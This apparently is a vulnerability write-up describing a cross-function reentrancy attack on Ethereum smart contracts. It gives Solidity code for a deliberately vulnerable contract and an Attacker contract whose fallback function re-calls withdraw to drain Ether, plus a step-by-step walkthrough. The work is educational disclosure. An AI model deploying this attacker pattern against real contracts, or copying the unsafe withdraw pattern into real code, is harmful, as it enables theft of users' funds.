# Cross_function_reentrancy

## Vendor
Cross-function Reentrancy

## Vulnerability Type
Cross Function Reentrancy Bug

## Abstract
We found a complex but common cross-function attack scenario in Ethereum smart contracts, where an attacker can undesirably reenter a function to steal money. The attack scenario can be abstracted as: (1) given a contract *Vulnerable* containing two transfer functions *getBonus* and *withdraw*, which can transfer Ether (cryptocurrency in Ethreum) to another contract. (2) Once function *getBonus* of contract *Vulnerable* is called to send some Ether to a contract *Attacker*, the *fallback* function of *Attacker* is automatically invoked. (3) In its *fallback* function, *Attacker* calls function *withdraw*, which will undesirably transfer money to *Attacker* again. While reentrancy exploiting one single function has been well studied, reentrancy vulnerability using cross-function has not yet been issued.

## Details
We present the specific steps for a specific reentrancy attack as shown in the figure below.

<div align=center><img width="520" height="240" src="./images/cross-function.png"/></div>

Contract *Vulnerable* containing two transfer functions *getBonus* and *withdraw*.
* *getBonus* declares one transfer operation, representing the recipient can claim the bonus.
* *withdraw* declares another transfer operation, making the recipient can withdraw his asset.
```
contract Vulnerable{
  ...
  
  // Each recipient should only be able to claim the bonus once
  function getBonus(address recipient) public {
      uint amountToWithdraw = rewardsForA[recipient];
      rewardsForA[recipient] = 0;
      if (recipient.call.value(amountToWithdraw)() == false) {
              throw;
      }
      totalbalance -= amountToWithdraw;
  }

  function withdraw(uint _amount) public {   
    msg.sender.call.value(_amount)();
    userBalances[msg.sender] -= _amount;
    totalbalance -= _amount;
  }
}
```

Contract *Attacker* containing the *attack* function and the *fallback* function.
* *attack* initates the first attack operation to call the function *getBonus*.
* *fallback* calls the function *withdraw*, causing the reentrancy attack to the contract *Vulnerable*.
```
contract Attacker{
  ...
  
  function attack(){
    vul.getBonus(_owner);
  }

  function () payable{ // fallback function
     count++;
     if(count < 10){
       vul.withdraw(1 ether);
     }
  }
}
```


**Step 1** The contract *Attacker* uses the function *attack* to call the function *getBonus* to obtain the bonus (Ether or money), aiming to initiate the attack. (attack (Attacker) -> getBonus (Vulnerable))

**Step 2** Due to the **Step 1**, the function *getBonus* involves the transfer operation (i.e., recipient.call.value(amountToWithdraw)() == false), which will automatically trigger the fallback function of *Attacker*. (withdraw (Vulnerable) -> fallback (Attacker))

**Step 3** The *fallback* function of contract *Attacker* maliciously invokes the function *withdraw* to withdraw its Ether. (fallback (Attacker) -> withdraw (Vulnerable))

**Step 4** However, the function *withdraw* also trigger the fallback function due to "msg.sender.call.value(_amount)()", which involuntarily triggers the *fallback* function of *Attacker* again. (withdraw (Vulnerable) -> fallback (Attacker))

**Step 5** Similarly, The *fallback* function reenter the contract *Vulerable* by calling the function *withdraw*, causing the recursive calls. By exploiting the reentrant call, the *Attacker* can access to the contract *Vulnerable* to steal Ether until all its Ether is exhausted. (fallback (Attacker) -> withdraw (Vulnerable) -> ...)

## Conclusion
All in all, this reentrancy situation is not uncommon. Attacker makes use of two transfer functions of vulnerable contract to trigger its fallback function, reentering the vulnerable contract to steal money. Since reentrancy can occur across multiple functions, and even multiple contracts, solutions aimed at detecting such reentrancy is also urgently required.

## Reference
https://github.com/Messi-Q/Vulnerabilities/blob/master/Reentrancy_cross_function.sol
https://consensys.github.io/smart-contract-best-practices/known_attacks/

